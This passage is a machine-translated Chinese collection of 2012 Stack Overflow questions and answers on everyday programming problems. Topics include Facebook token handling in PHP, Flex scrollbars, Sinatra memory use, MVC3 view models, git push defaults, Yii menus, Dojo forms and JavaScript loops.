到目前为止的答案建议文件锁定，我已经尝试过调查。我能找到的最接近的事情是设置[`NSFileImmutable`](http://developer.apple.com/library/ios/documentation/cocoa/reference/foundation/Classes/NSFileManager_Class/Reference/Reference.html#//apple_ref/doc/c_ref/NSFileImmutable)标志。但似乎任何其他程序都可以出现，取消设置并修改文件。有没有更好的方法来锁定文件？

**编辑 2**

有人要求一个用例。假设我正在尝试使两个文件夹保持同步。对一个文件夹中的文件所做的任何更改都会镜像到另一个文件夹中，反之亦然。如果我从文件夹 A 中删除文件 1，我也会从文件夹 B 中删除文件 1。但是如果文件夹 B 中的文件 1 在我删除之前发生更改；然后我不想删除它，而是想将它同步回文件夹 A

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-04T16:38:35.017

在我看来，您应该继续删除匹配的文件。除非您担心某些其他应用程序会更改文件以使其无法删除，否则锁定是没有意义的。想想看；您找到了符合您的删除条件的文件。你想删除它。在此期间是否发生变化真的很重要吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T02:49:45.483

您可以使用强制（内核强制）文件锁定来锁定有问题的文件，以防止在您对文件进行操作时对其进行更改。我知道 Linux 和 Solaris 支持强制文件锁定，但我不知道 OS X / HFS+ 是否支持以及如何使用它。希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T02:53:03.803

那么你有不止一个属性查询呢？如果是这样，为什么不在开始查询之前锁定文件？完成后，解锁。然后如果删除，删除。

有一种方法可以用 Cocoa 锁定文件；几天前我用谷歌搜索并解决了这个问题，但我已经忘记了具体的信息；对不起..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-11T14:56:16.343

我建议使用消息来接受或删除此方法的文件：

```
fileManager:shouldRemoveItemAtPath: 
```

您开发的原型是调用方法删除文件，并在方法 shouldRemoveItemAtPath：您接受（返回 YES）或拒绝（返回 NO）作为文件属性值。

希望这有帮助

# facebook - Facebook 访问令牌和 AJAX 调用

> ID：11782809
> 
> 赞同：1
> 
> 时间：2012-08-02T17:34:06.553
> 
> 标签：facebook

我有一个最初在 PHP 中编码为服务器端身份验证的应用程序。

但是，我希望客户端对我的服务器进行 AJAX 调用，然后基于 Facebook userId 在我的数据库中执行一些查询。我不能只接受一个userId变量，因为任何人都可以欺骗它，所以我认为我需要访问用户的accessToken。

但是，这是对服务器上 PHP 文件的 AJAX 调用，我无法使用与示例中相同的服务器端身份验证方法。

所以我认为客户端需要通过 AJAX 调用传递一个 FB 访问令牌，然后我在服务器端验证该访问令牌，然后使用它来获取用户的 id 和附加信息。

但是，如果我使用服务器端身份验证，客户端实际上永远不会从 Facebook 检索其访问令牌，只有服务器拥有它，这意味着客户端无法传递访问令牌。

我的问题是：一旦我进行了原始的服务器端验证，我是否应该根据 cookie 在服务器端存储访问令牌，然后以这种方式获取 access_token？

或者，对于 Facebook 应用程序是否有更好的做法，这样我就不必担心通过 cookie 欺骗泄露访问令牌？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:14:40.757

首先，您不应将访问令牌存储在 cookie 中或通过 ajax 调用发送。访问令牌是必须始终不可见的敏感数据。

我不知道这是否是最好的方法，但我总是使用signedRequest。这是发送到您的服务器的安全数据，因为它是使用您的应用程序机密加密的，没有人知道...

如果您将 signedRequest（来自 FB JS SDK）传递到您的服务器，则可以检索有效的访问令牌。在 PHP 中，它看起来像这样，假设您通过 POST 传递 signedRequest：

```
$signed_request = $_POST['signedRequest'];
$data = parseSignedRequest($signed_request);
$token_url= 'https://graph.facebook.com/oauth/access_token?' .
            'client_id=' . YOUR_APP_ID .
            '&redirect_uri='  . // when using the JS signedRequest, leave this blank
            '&client_secret=' . YOUR_APP_SECRET .
            '&code=' . $data["code"];

$response = file_get_contents($token_url);
$params = null;
parse_str($response, $params);
$access_token = $params['access_token']; // here is your access token 
```

您将需要这些功能：

```
function parseSignedRequest($signed_request) {
    list($encoded_sig, $payload) = explode('.', $signed_request, 2);
    // decode the data
    $sig = base64UrlDecode($encoded_sig);
    $data = json_decode(base64UrlDecode($payload), true);

    if (strtoupper($data['algorithm']) !== 'HMAC-SHA256') {
        return 'Unknown algorithm. Expected HMAC-SHA256';
    }

    // check sig
    $expected_sig = hash_hmac('sha256', $payload, YOUR_APP_SECRET, $raw = true);
    if ($sig !== $expected_sig) {
        return 'Bad Signed JSON signature!';
    }
    return $data;
}

function base64UrlDecode($input) {
    return base64_decode(strtr($input, '-_', '+/'));
} 
```

当然，如果您将访问令牌存储在数据库中，则无需通过此操作，但请注意令牌过期。

如果用户已经授权您的应用程序并登录 Facevook，您可以从 cookie 中检索 signedRequest `$_COOKIE[('fbsr_' . YOUR_APP_ID)]`，但我不太相信这些数据......

# actionscript-3 - 弹性 4 重新计算范围？

> ID：11782810
> 
> 赞同：3
> 
> 时间：2012-08-02T17:34:10.777
> 
> 标签：actionscript-3, flash, apache-flex, math, scroll

我正在构建一个 Flex 4 应用程序，它使用一个`<s:Scroller>`组件来垂直滚动溢出的内容。在我提出问题之前，让我解释一下会发生什么：

1.  页面的主体是从数据库加载的
2.  加载信息后，将构建应用程序的“主体”（在本例中为您在下面看到的项目列表）
3.  一旦构建了列表，整个封装组件就会使用 TweenMax 转换到视图中，如下所示：

    ```
    myComponent.visible = true;

    TweenMax.to(myComponent, 1, {
      alpha : 1,
      y -= 20 //Slides the component up 20px from its original location
    }); 
    ```

下面是结果。请注意滚动条是如何一直向下滚动的，但是您可以看到在最底部被切断的几个白色字母的提示。

使用我的自定义菜单，我可以离开页面并返回到它，Flex 将正确地重新计算滚动条的范围，这样我就可以向下滚动并查看所有所需的内容。**仅当用户输入的初始**URL 是像这样的较长页面时，才会发生此问题。

关于如何强制 Flex 重新计算滚动条范围的任何想法？

感谢您的时间。

![在此处输入图像描述](../Images/35e24e8c6ffef4f9bd2817e4833ae9f6.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T16:02:05.350

好的，经过数小时的研究、拼凑和反复试验，这就是我想出的。

**我做错了什么：**

当我第一次发布这个问题时，我提到的“组件”已经被添加为 的子元素`<s:Scroller>`，但折叠并隐藏起来，如下所示：

```
<comp:MyComp alpha="0" height="0" visible="false"/> 
```

当数据被加载并且组件的视觉外观将被恢复并转换到位时，如下所示：

```
myComp.visible = true;
myComp.height = NaN;
myComp.invalidateSize();
myComp.height = myComp.measuredHeight;

TweenMax.to(myComp, 1, {
  alpha : 1,
  y -= 20 //Slides the component up 20px from its original location
}); 
```

这种方法`<s:Scroller>`直到后来才强制重新计算其适当的大小，有时直到`myComp`被转换离开并且另一个组件使用相同的方法转换到位。即使这样，滚动条的大小也会适合前一个组件的大小，而不是当前显示的那个。

**现在，我在做什么正确：**

我的研究表明，无论何时`addElement()`调用该方法，无论是直接在`<s:Scroller>`自身内部还是由其任何子级`measure()`调用，都会调用滚动条的方法，并适当地重新调整滚动条的大小。

我没有将组件放置在滚动条内并简单地隐藏它们直到我需要它们，而是在 ActionScript 中动态地创建它们，设置它们的属性，并根据需要分别使用`addElement()`和`removeElement()`方法添加和删除它们。现在，随着旧元素被转移，新元素取而代之，滚动条会正确调整自身大小。

我面临最后一个问题。如果用户正在查看的第一个页面（即没有先前的组件被转换和销毁）需要一个滚动条，它就不会显示。

我通过添加一个事件侦听器来纠正最后一个问题，该侦听器在新组件完成转换到位时进行侦听。在事件处理程序内部，我使用以下代码显式设置组件的高度：

```
newComp.height = NaN;
newComp.invalidateSize();
newComp.height = newComp.measuredHeight; 
```

现在组件有了明确的高度，滚动条现在出现了，即使它是第一页。

现在，滚动条在所有情况下都可以按预期工作，并且不会切断任何内容或在不应该的时候消失。

我希望它对某人有帮助。

# ruby - 如何从 Sinatra App 中释放内存

> ID：11782811
> 
> 赞同：1
> 
> 时间：2012-08-02T17:34:11.230
> 
> 标签：ruby, activerecord, sinatra

使用 Sinatra 应用程序设置 api。

每个请求为 15MB。每次我刷新页面时，它都会增加 15MB 的内存。每次请求后如何清除信息？

```
require 'rubygems'
require 'sinatra'
require 'active_record'
require 'mysql2'
require 'json'

client = Mysql2::Client.new(adapter: 'mysql2', host: '127.0.0.1', database: 'dev_app', username: 'root', password: 'root')

get '/people' do
  q = "select name, age from people;"
  people = client.query(q, :as => :json).map{|one| {one['name'] => one['age'].to_i}}
  return people.to_json
  people = nil
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T13:46:11.553

### 简介，简介，简介

您尚未确定应用程序中实际消耗内存的内容。因此，您的问题是未定义的，任何“解决方案”都相当于在寻找潜在答案时四处寻找。

### 潜在的答案

1.  内存增长本质上不是问题，除非你真的用完了它。如果这没有发生，请不要理会它。
2.  mysql2 gem 有一些已知的内存问题。这可能适用于您的场景。
    *   [https://github.com/brianmario/mysql2/issues/85](https://github.com/brianmario/mysql2/issues/85)
    *   [http://dev.mysql.com/doc/refman/5.0/en/mysql-use-result.html](http://dev.mysql.com/doc/refman/5.0/en/mysql-use-result.html)
    *   [http://numbers.brighterplanet.com/2011/03/15/what-you-should-know-about-mysql2-memory-usage/](http://numbers.brighterplanet.com/2011/03/15/what-you-should-know-about-mysql2-memory-usage/)
3.  [垃圾收集](http://www.ruby-doc.org/core-1.9.3/GC.html)不会仅仅因为变量或文字超出范围而发生。有些情况会触发垃圾收集，但除非你真的受到内存限制，否则你不应该到处乱搞或修补你的垃圾收集器。
    *   [http://www.engineyard.com/blog/2011/tuning-the-garbage-collector-with-ruby-1-9-2/](http://www.engineyard.com/blog/2011/tuning-the-garbage-collector-with-ruby-1-9-2/)
    *   [http://www.ruby-doc.org/core-1.9.3/GC.html#method-c-stat](http://www.ruby-doc.org/core-1.9.3/GC.html#method-c-stat)
4.  确保您了解[Sinatra 中的范围，](http://www.sinatrarb.com/intro#Scopes%20and%20Binding)以便您知道对象何时应该超出范围。但是，仅仅因为对象超出范围并不意味着它们*将*被垃圾收集，只是它们*可以*。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T12:57:11.257

不确定这是否重要，但我很确定你的 get '/people' 块的最后一行没有被调用，因为你有明确的回报

```
return people.to_json # this exits the block
people = nil #this never gets called. 
```

# asp.net-mvc-3 - 使用 viewModel 时将模型从控制器传递到视图时出现 MVC3 错误

> ID：11782812
> 
> 赞同：1
> 
> 时间：2012-08-02T17:34:15.257
> 
> 标签：asp.net-mvc-3, linq, entity-framework-4

对不起，因为我确信有一种方法可以使用 viewModel 来做到这一点，但是我对此非常缺乏经验，甚至不知道我是否正确地做到了。

我想要做的是传递多个博客以及将每个博客发布到视图的用户的个人资料信息。

我收到以下错误。

> 传入字典的模型项的类型为“ACapture.Models.ViewModels.BlogViewModel”，但该字典需要类型为“System.Collections.Generic.IEnumerable`1[ACapture.Models.ViewModels.BlogViewModel]”的模型项。

我正在尝试将以下查询结果传递给视图。

```
 var results = (from r in db.Blog.AsEnumerable()
                       join a in db.Profile on r.AccountID equals a.AccountID
                       select new { r, a });

        return View(new BlogViewModel(results.ToList()));
    } 
```

这是我的视图模型

```
public class BlogViewModel
{
    private object p;

    public BlogViewModel(object p)
    {
        this.p = p;
    }
} 
```

而我的看法

```
@model IEnumerable<ACapture.Models.ViewModels.BlogViewModel>
@{
    ViewBag.Title = "Home Page";
}

<div class="Forum">
    <p>The Forum</p>

            @foreach (var item in Model)
            {
                <div class="ForumChild">

                    <img src="@item.image.img_path" alt="Not Found" />
                    <br />
                        <table>
                            @foreach (var comment in item.comment)
                            {

                                <tr><td></td><td>@comment.Commentation</td></tr>
                            }
                        </table>
                </div>                
            }
</div> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:39:08.207

我想你需要稍微改变你的视图模型：

```
public class BlogViewModel
{
    public Blog Blog { get; set; }
    public Profile Profile{ get; set; }
} 
```

然后按如下方式返回：

```
 var results = (from r in db.Blog.AsEnumerable()
                   join a in db.Profile on r.AccountID equals a.AccountID
                   select new new BlogViewModel { Blog = r, Profile = a });

    return View(results.ToList()); 
```

然后在`foreach`视图内部的循环中，您将获得一个包含 - 个人资料和博客信息的对象，因此您可以像 fe 一样使用它`@item.Profile.Username`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:53:03.127

在这种情况下，我不完全确定您要使用 ViewModel 完成什么，但您似乎希望该页面代表一个包含评论集合的单个博客。在这种情况下，您应该更换

```
IEnumerable<ACapture.Models.ViewModels.BlogViewModel> 
```

和

```
ACapture.Models.ViewModels.BlogViewModel 
```

然后`Model`表示单个 BlogViewModel，您可以使用 迭代评论`Model.comments`并使用`Model.image.img_path`.

如果不是这种情况，并且您打算每个页面有多个 BlogViewModel，那么您将必须实际构建一个 BlogViewModel 集合并将其传递给视图。

# git - 被克隆的 git config

> ID：11782825
> 
> 赞同：1
> 
> 时间：2012-08-02T17:35:16.477
> 
> 标签：git

目标是这样做之后`git clone git@somewhere:something.git`

结果`something/.git/config`将包含

```
[push]
    default = tracking 
```

不需要克隆人这样做`cd something; git config push.default tracking`，他/她不会在没有参数的情况下推送所有分支（不，没有人阅读自述文件）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:01:25.843

由于很难在下游或客户端执行策略（这很危险，正如[knittl](https://stackoverflow.com/users/112968/knittl)评论的那样），即将推出的**Git 2.0**认识到这一事实并将更改默认推送策略。

^(（关于这个日期的讨论从2012年初开始，如“[`git push`当前分支](https://stackoverflow.com/a/9749535/6309)”所示）)

它将从当前的默认值开始：

> **`matching`**- 将所有具有相同名称的分支推入两端。
> 这适用于那些将所有分支准备成可发布的形状，然后用一个命令将它们推出的人。
> **它不适合推送到由多个用户共享的存储库**，因为如果其他用户更新了分支，本地停滞的分支将尝试非快进推送。
> **这是目前的默认值，但 Git 2.0 会将默认值更改为`simple`**.

到新的，叫做“ **`simple`**”：

> `upstream`- 将当前分支推送到其上游分支。
> 这样，`git push`将更新与 git pull 合并的远程 ref 相同的远程 ref，使推送和拉取对称。`branch.<name>.merge`如何配置上游分支见“ ”。
> 
> **`simple`**- 与上游类似，但如果上游分支的名称与本地分支不同，则拒绝推送。
> **这是最安全的选择，非常适合初学者**。它将成为 Git 2.0 中的默认设置。

# php - Yii - 如果当前页面与链接相同，如何与类建立链接？

> ID：11782826
> 
> 赞同：0
> 
> 时间：2012-08-02T17:35:19.610
> 
> 标签：php, yii

例如，我有这个结构：

```
<div id="menuPainelSuperior">
 <a href="<?= CController::createUrl('site/seu_cadastro')?>">Cadastro</a>
 <a href="<?= CController::createUrl('site/lista_clientes') ?>">Clientes</a>
 <a href="<?= CController::createUrl('site/projetos') ?>">Projetos</a>
 <a href="<?= CController::createUrl('site/orcamentos') ?>">Orçamentos</a>
</div> 
```

如果当前页面是“domain.com/site/seu_cadastro”，我希望第一个链接具有以下类：“activePageMenu”

有谁知道怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:27:29.487

您可以在链接上放置一个 if 语句，以查看当前控制器和操作是否与您在链接中放置的控制器和操作相同。你得到它们是这样的：

```
$controller = Yii::app()->controller->id;
$action =  Yii::app()->controller->action->id;
$class = '';
if($controller == 'site' && $action == 'seu_cadastro') $class = 'activePageMenu';
echo CHtml::link('Cadastro',array('site/seu_cadastro'),array('class'=>$class)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T18:28:12.447

您是否考虑过使用[CMenu](http://www.yiiframework.com/doc/api/1.1/CMenu/)中的构建来执行此操作？

**更新：** Pitchinnate 的回答也是一种方法。

# facebook - Prompt for Facebook permission only if you do not already have basic permissions

> ID：11782828
> 
> 赞同：2
> 
> 时间：2012-08-02T17:35:28.737
> 
> 标签：facebook, facebook-javascript-sdk

I have Facebook Authentication setup on my application using the Facebook Javascript SDK. I currently don't ask for the email permission. I want to prompt users for email permission but only for users who have not given basic permissions to my site already.

Is there a way to prompt email permission only if they have not given basic permissions to my application?

If possible, I'd like to be able to do this without multiple permissions popups.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:23:05.943

看看我的理解是否正确，你的意思是对于目前没有你的应用程序授权的用户，当你要求他们登录时，你想请求他们的电子邮件许可，而对于你授权的用户，没有改变，对吧？

如果是这样，这样的事情就可以解决问题，在您的 FB.init 之后或单击按钮或您现在正在进行 FB 登录的任何地方插入它：

```
FB.getLoginStatus(function(response) {
    if (response.status === 'connected') {
        // log the user into your site using FB.getAccessToken() or do whatever you normally do.
    } 
    else if (response.status === 'not_authorized') {
        // ask the user for permissions
        FB.login(function(response) {
            // handle response
        }, {scope: 'email'});
    }
}); 
```

警告：如果用户当前未登录 Facebook 并且您的应用程序已获得授权，这将无济于事，要使其不这样做，您必须将 else if 替换为一般的 else，但它会在老用户登录时显示“请求电子邮件权限”弹出窗口。

# python - Python-如何删除两个常量分隔符之间的所有数据——解析嘈杂的 HTML 数据

> ID：11782835
> 
> 赞同：-2
> 
> 时间：2012-08-02T17:35:51.613
> 
> 标签：python, regex, parsing, beautifulsoup

我正在解析 Wikipedia 纯文本数据。无论出于何种原因，附加到每页末尾的是以下文本：

```
af:Vlermuis
ang:Hreaðemūs
ar:خفاش
an:Chiroptera
ast:Esperteyu
gn:Mbopi
ay:Chiñi
az:Yarasalar
bn:বাদুড়
zh-min-nan:Bi̍t-pô
be:Рукакрылыя
be-x-old:Рукакрылыя
bg:Прилепи
br:Askell-groc'hen
ca:Ratpenat
cv:Çара çерçи евĕрлисем
cs:Letouni
co:Topu pinnutu
cy:Ystlum
da:Flagermus
de:Fledertiere
nv:Jaaʼabaní Danilínígíí
et:Käsitiivalised
el:Νυχτερίδα
eml:Pipistrel
es:Chiroptera
eo:Kiropteroj
eu:Saguzar
fa:خفاش
fo:Flogmýs
fr:Chiroptera
ga:Ialtóg
gd:Ialtag
gl:Morcegos
gan:簷老鼠
hak:Phi̍t-phò-è
xal:Бавуха
ko:박쥐
hi:चमगादड़
hr:Šišmiši
io:Vespertilio
id:Kelelawar
ia:Vespertilion
is:Leðurblaka
it:Chiroptera
he:עטלפים
jv:Lawa
pam:Talibatab
ka:ხელფრთიანები
kk:Қолқанаттылар
rn:Agahungarema
sw:Popo
ht:Chòvsourit
ltg:Plykspuorņi
la:Chiroptera
lv:Sikspārņi
lt:Šikšnosparniai
lij:Chiroptera
li:Vleermuis
ln:Ngɛmbo
hu:Denevérek
mk:Лилјаци
ml:വവ്വാൽ
mr:वटवाघूळ
ms:Kelawar
mdf:Веньдряв
my:လင်းနို့
nah:Tzinācantli
nl:Vleermuizen
ne:चमेरो
ja:コウモリ
frr:Fladermüsen
no:Flaggermus
nn:Flaggermus
nrm:Caûque-souothis
nov:Chiroptera
oc:Chiroptera
koi:Кушборддэз
pcd:Soerie-volante
pms:Ratavolòira
pl:Nietoperze
pt:Morcego
ro:Chiroptere
rm:Utschè-mezmieur
qu:Masu
ru:Рукокрылые
sah:Илии кынаттаахтар аймахтара
sc:Chiroptera
sco:Baukie
stq:Flädderdierte
sq:Lakuriqi i natës
scn:Taddarita (armalu)
simple:Bat
sk:Netopiere
sl:Netopirji
sr:Слепи мишеви
sh:Šišmiš
su:Kalong
fi:Lepakot
sv:Fladdermöss
tl:Paniki
ta:வௌவால்
te:గబ్బిలం
th:ค้างคาว
tg:Кӯршапарак
chy:Méšenonetsénóne
tr:Yarasa
uk:Кажани
ur:چمگاڈر
vi:Bộ Dơi
war:Kabog
yo:Àdán
zh-yue:蝙蝠
zea:Vleermuzen
zh:蝙èﾝ 
```

删除“af”和“zh”之间所有内容的最pythonic方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T19:01:00.937

我正在做一些维基百科解析，并且遇到了类似的问题。但是，并非我正在解析的所有页面底部都有该文本，所以我从未解决过这个问题。

这里有一些东西可以帮助您入门。玩弄 index 与 rindex，并检查是否存在问题。

```
def delete_everything_in_between(st, start, end):
    first_index = st.index(start)
    second_index = st.index(end)
    return st[:first_index] + st[second_index:]

delete_everything(st, 'af', 'zh') 
```

当然，如果你愿意假设垃圾文本总是在输入的末尾，你可以找到第一个索引并返回 st[:first_index]。

# dojo - Dojo Form onSubmit Event

> ID：11782836
> 
> 赞同：1
> 
> 时间：2012-08-02T17:36:00.743
> 
> 标签：dojo

I would like to use a `dijit.form.Form` for my application login, allow dojo to perform the form validation and use xhrPost to submit the form. I believe this can readily be done by over-riding the `onSubmit` event and using `this.validate()` to validate the login form.

For successful login, how can I tell when the `onSubmit` event is done so I can safely remove the login form from the DOM?

From the documentation it appears that dojo (validate?) may continue to reference the login form in the DOM after returning (false in my case) from onSubmit. Is there a way to "listen" for the onSubmit event to complete so I can safely remove the login form from the DOM?

**EDIT**

@BuffaloBuffalo - I tried your example and called dojo.xhrPost within the onSubmit this.validate().

The onSucessFunction received control and completed processing prior to returning to the statement after dojo.xhrPost which is the return false from the onSubmit event. To recap, this.validate() was true, the login form was validated by dojo and the onSuccessFunction received control as shown in your example. However, rather than hide the login DOM, I actually remove it completely with dojo 1.7.3 AMD syntax below:

```
 var loginDOMnode = dom.byId("Login");
   array.forEach(registry.findWidgets(loginDOMnode), 'item.destroyRecursive(true)');
   domConstruct.empty(loginDOMnode); 
```

I am using IE 9 and I get the following error:

> SCRIPT5007: Unable to get value of the property 'value': object is null or undefined ValidationTextBox.js, line 14 character 1

Since I return false from onSubmit this.validate() after I remove the login form from the DOM, it appears that I am removing it from the DOM before dojo is done with the ValidationTextBox. Is there a way to have the onSucessFunction run after I return false from onSubmit this.validate()?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T19:18:12.323

如果您使用ajax（例如xhrPost）提交登录过程，则需要监听该异步事件的返回。在您的自定义表单中：

```
onSubmit:function(e){
    //stop event
    dojo.stopEvent(e);
    //validate your form
    var onSucessFunction = function(){
        //hide login dom
    };
    var onErrorFunction = function(){
        //show an error
    };
    dojo.xhrPost({
        //parameters
    }).then(onSucessFunction,onErrorFunction); 
```

},

# javascript - javascript multiple loops

> ID：11782837
> 
> 赞同：2
> 
> 时间：2012-08-02T17:36:01.880
> 
> 标签：javascript, loops

I am trying to get the sum of a list of words displayed in an HTML browser.

If each word is assigned a number i.e

> a is 1, b is 2

and so on upto z is 26, then the sum of apple should be 50\. I want them to be displayed in browser like below:

```
apple  
carrot
money  

50
75
72 
```

but I am not able to get the loop to work correctly.

```
<!DOCTYPE html>
<html>
<head>
<title></title>
<link rel="stylesheet" rev="stylesheet" href="script.css" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript">
   function newSquare(){
      for(var j=0; j<10; j++){
         calcAlpha(j);
      }
   }
   function newDisplay(){
      for(var k=0; k<10; k++){
         calcAlpha(k);
      }
   }
   function calcAlpha() {
      var word = document.getElementById("square + j").childNodes[0].data;
      var sum = 0;
      for(var i=word.length-1; i>=0; i--) {
         sum += (word.charCodeAt(i) - 96);
      }
      document.getElementById("display + k").innerHTML=sum
   }
</script>
</head>
<body>
   <h1>Calculate sum of words</h1>
   <table>
      <tr><td id="square1">apple</td></tr>
      <tr><td id="square2">carrot</td></tr>
      <tr><td id="square3">money</td></tr>
      <tr><td id="square4">game</td></tr>
   </table>
   <table>
      <tr><td id="display1">&nbsp;</td></tr>
      <tr><td id="display2">&nbsp;</td></tr>
      <tr><td id="display3">&nbsp;</td></tr>
      <tr><td id="display4">&nbsp;</td></tr>
   </table>
   <div id="display"></div>
   <button onclick="calcAlpha()">calculate</button>
</body>
</html> 
```

Can someone can sort this for me? I am still a beginner at Javascript, and I dont understand how to put i,j, and k in loops. Thanks.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:01:31.617

这是一个完整的答案：

代码存在三个主要问题。首先，在此示例中，i、j 和 k 是`var`具有特定整数值的 。`"square + j"`只是一个没有所需值的字符串（即`square1`，`square2`等）。正如迈克尔建议的那样，您应该输入“square”+ j。

第二个问题是在您的网页中运行的唯一函数是`calcAlpha()`，您在元素`onclick`事件中调用它。`button`在`calcaAlpha()`你内部永远不会调用`newSquare()`or `newDisplay()`，所以它们永远不会执行。

第三个问题是命名空间，或 JavaScript 变量的范围。在内部`calcAlpha()`您无法访问变量`j`，或者`k`因为它们是在不封装`calcAlpha()`函数的外部函数中声明的。但是，您可以访问该变量`i`，因为它是在`calcAlpha()`.

您的问题的解决方案是删除`newDisplay()`并`newSquare()`更改`calcAlpha()`为以下内容：

```
function calcAlpha() {
    for (var j = 1; j <= 4; j++) {
        var word = document.getElementById("square" + j).childNodes[0].data;
        var sum = 0;
        for(var i=word.length-1; i>=0; i--) {
            sum += (word.charCodeAt(i) - 96);
        }
        document.getElementById("display" + j).innerHTML=sum

    }
} 
```

这基本上是针对上述其他问题的合并代码，`newSquare()`并`newDisplay()`已`calcAlpha()`针对上述其他问题进行了修复。请注意，该变量`k`是不必要的，因为您想将 的数字总和`squareN`放入`displayN`中，因此您可以使用单个变量`j`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:58:39.153

我不确定你想用这些函数做什么，但试试这个：

```
function run() {
// reads, calculates and prints all words
    for (var i=1; i<=4; i++) {
        var word = document.getElementById("square"+i).childNodes[0].data;
        var result = calcAlpha(word);
        document.getElementById("display"+i).childNodes[0].data = result;
    }
}
function calcAlpha(text) {
   text = text.toLowerCase();
   var sum = 0;
   for (var i=text.length-1; i>=0; i--) {
       sum += text.charCodeAt(i) - 96;
   }
   return sum;
} 
```

`run`并从按钮调用函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:59:04.210

第一个问题，正如迈克尔所说，是这样的：

```
document.getElementById("square + j")
// and
document.getElementById("display + k") 
```

这将寻找与or`id`完全匹配的元素。要将变量的值连接到字符串，请使用and 。`"square + j"``"display + k"``"square" + j``"display" + k`

第二个问题是在 的上下文中`calcAlpha`，变量`j`和`k`是未定义的。您可以通过使它们可访问`calcAlpha`（通过在范围之外定义它们`function calcAlpha`）或通过传递`j`（或`k`）作为参数来解决此问题。您已经在做第一部分（实际上是传递它）。您现在需要的只是在 的声明中使用它`calcAlpha`，如下所示：

```
function calcAlpha(index) {
  var word = document.getElementById("square" + index).childNodes[0].data;
  // [...]
} 
```

该变量`index`现在将包含您传递的`j`or的值。`k`

另一件事：您`calcAlpha`同时从其他函数和`<button>`onclick 调用。这可能不是你想要做的。看看[Bergi 的回答](https://stackoverflow.com/a/11783169/990877)，他/她的解决方案应该可以解决您的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:57:17.063

我看到您立即做错的一件事是通过 id 获取元素。您将循环变量包含为字符串而不是 int。这是我的解决方案：

```
<!DOCTYPE html>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript">

   function calcAlpha()
   {
        for(j =1; j<=4; j++)
        {
            var word = document.getElementById("square" + j).innerHTML;
            var sum = 0;
            for(var i=word.length-1; i>=0; i--) 
            {
                sum += (word.charCodeAt(i) - 96);
            }
            document.getElementById("display" + j).innerHTML=sum
        }
   }

</script>
</head>
<body>
   <h1>Calculate sum of words</h1>
   <table>
      <tr><td id="square1">apple</td></tr>
      <tr><td id="square2">carrot</td></tr>
      <tr><td id="square3">money</td></tr>
      <tr><td id="square4">game</td></tr>
   </table>
   <table>
      <tr><td id="display1">&nbsp;</td></tr>
      <tr><td id="display2">&nbsp;</td></tr>
      <tr><td id="display3">&nbsp;</td></tr>
      <tr><td id="display4">&nbsp;</td></tr>
   </table>
   <div id="display"></div>
   <button onclick="calcAlpha()">calculate</button>
</body>
</html> 
```

# c# - 将外部 javascript 文件视为 Aspx 页面的一部分

> ID：11782845
> 
> 赞同：0
> 
> 时间：2012-08-02T17:36:20.453
> 
> 标签：c#, javascript, asp.net

我知道您不能在外部 javascript 文件中使用 asp net server 标签。这有点痛苦，因为它迫使您在 aspx 页面中声明需要 ClientID 的变量，然后在外部 javascript 文件中引用它们。不是很干净。目前，我使用脚本管理器的复合脚本来注册我的脚本...如果我可以注入脚本并像处理页面的一部分一样处理服务器标签，那就太好了。这可能吗？

我知道有 RegisterClientScript 但这似乎也不尊重脚本标签。我想知道是否有人提出了一种解决方案，只需在处理之前提取 javascript 文件的内容并将它们推入 aspx 页面，以便可以处理服务器标签。我浏览了整个网络，除了在 aspx 页面中使用服务器标签或生成控件的 id 等服务器端和生成脚本之外，没有看到任何好的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:53:18.377

> 我知道你不能在外部 javascript 文件中使用 asp net server 标签

您可以创建一个 ASPX 页面来生成动态 javascript

```
<%@ Page Language="C#" AutoEventWireup="false"
CodeFile="script.aspx.cs" Inherits="scripts_script"
EnableViewState="false" StyleSheetTheme="" %>
function test() {
    testinfo.innerHTML = "<%= MyVariable %>";
} 
```

确保设置，`StyleSheetTheme=""`否则运行时将插入`<head>`您不想要的

并在后面的代码中将 ContentType 设置为`application/x-javascript`

```
using System;

public partial class scripts_script
{
    protected override void OnLoad(EventArgs e)
    {
        base.OnLoad(e);
        this.Response.ContentType = "application/x-javascript";
    }
} 
```

现在您可以像使用`.js`文件一样使用这个 ASPX 页面。

# asp.net-mvc-3 - context.SaveChanges() 有效，但数据库从未更新？(MVC 3)

> ID：11782846
> 
> 赞同：0
> 
> 时间：2012-08-02T17:36:32.133
> 
> 标签：asp.net-mvc-3

我在 ASP.NET MVC3 中编写了一个表单，我无法获取条目来保存我在数据库中所做的更改，但是在调试时，我注意到这些更改反映在数据上下文中。我在运行此代码时没有遇到任何错误。如果您需要更多，请告诉我。谢谢！

**控制器**

```
[HttpPost]
    public ActionResult Edit(Tool tool, FormCollection collection)
    {
        if (collection["Tool.Person.PersonID"] != "")
        {
            tool.Person= context.People.Find(
                 Convert.ToInt32(collection["Tool.Person.PersonID"])
            );
        }
